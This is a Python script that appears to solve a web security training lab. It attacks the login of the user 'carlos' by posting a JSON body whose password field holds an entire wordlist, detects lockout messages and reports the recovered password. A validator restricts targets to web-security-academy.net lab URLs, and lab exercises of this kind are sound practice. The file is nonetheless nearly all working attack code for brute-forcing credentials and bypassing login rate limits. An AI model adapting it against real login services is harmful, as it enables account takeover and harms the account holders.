import json
from http import HTTPStatus

import requests
import re
from typing import Callable
import typer
from rich.console import Console
from rich.progress import Progress
from lxml import html
from valid8 import validate

console = Console()
app = typer.Typer()


def convert_to_json(passwords):
    dictionary = {
        "username": "carlos",
        "password": passwords,
    }
    json_object = json.dumps(dictionary)
    return json_object


def get_password():
    passwords = []
    with open('password.txt') as f:
        for line in f:
            passwords.append(line.strip())
    return passwords


def check_login_blocked(response):
    html_document = html.fromstring(response.content)
    check_block = html_document.xpath(
        "//p[contains(text(), 'You have made too many incorrect login attempts. Please try again in 1 minute(s)')]")
    if len(check_block) > 0:
        raise Exception(check_block[0].text)


def full_login(server):
    passwords = get_password()
    current_password = None
    with Progress() as progress:
        task = progress.add_task("[bold yellow]Try to access to Carlos account and discovering password...", total=len(passwords))
        while len(passwords) > 0:
            progress.update(task, advance=1)
            current_password = passwords.pop()
            response = requests.post(f"{server}/login", data=convert_to_json(passwords))
            check_login_blocked(response)
            if "302" not in str(response.history) and len(passwords) > 0:
                progress.update(task_id=task, description="[bold green]Password found", advance=len(passwords))
                break
    print("The password of Carlos is: " + current_password)


def no_full_login(server):
    passwords = get_password()
    response = requests.post(f"{server}/login", data=convert_to_json(passwords))
    check_login_blocked(response)
    if response.history[0].status_code == HTTPStatus.FOUND:
        console.log("Carlos logged in successfully")


def check_lab_solver(server):
    response = requests.get(f"{server}/")
    html_document = html.fromstring(response.content)
    solved_link = html_document.xpath("//section[@id='notification-labsolved']")
    success_message = "Congratulations, you solved the lab!".center(100)
    error_message = "Not Solved!".center(100)

    if solved_link:
        console.print(success_message, style="blink bold white on dark_green")
    else:
        console.print(error_message, style="blink bold white on red")


def pattern(regex: str) -> Callable[[str], bool]:
    r = re.compile(regex)

    def res(value):
        return bool(r.fullmatch(value))

    res.__name__ = f'pattern({regex})'
    return res


def validate_server(server):
    validate("server", server, length=65, custom=[pattern(r'\w{5}:\/\/\w{32}\.web-security-academy\.net$')],
             help_msg="Insert a valid URL from web security academy")

    if requests.get(f"{server}").status_code != 200:
        raise Exception("URL NOT VALID!")


def is_lab_solved(server):
    response = requests.get(f"{server}/")
    html_document = html.fromstring(response.content)
    solved_link = html_document.xpath("//section[@id='notification-labsolved']")
    return True if solved_link else False


@app.callback()
def main(
        server: str = typer.Option(
            ...,
            prompt=True,
            envvar="SERVER",
            help=f"Vulnerable server ID"
        ),
        full: bool = typer.Option(
            default=False,
            help=f"full to discovery Carlos password, no-full to access only without discovery password"
        )
):
    validate_server(server)

    if full:
        full_login(server)
    else:
        with console.status("Try to access to Carlos account..."):
            no_full_login(server)

    with console.status("Checking solving lab"):
        check_lab_solver(server)


def run():
    try:
        typer.run(main)
    except Exception as e:
        console.print(f"[red bold]Error:[/red bold] {e}")


if __name__ == "__main__":
    run()
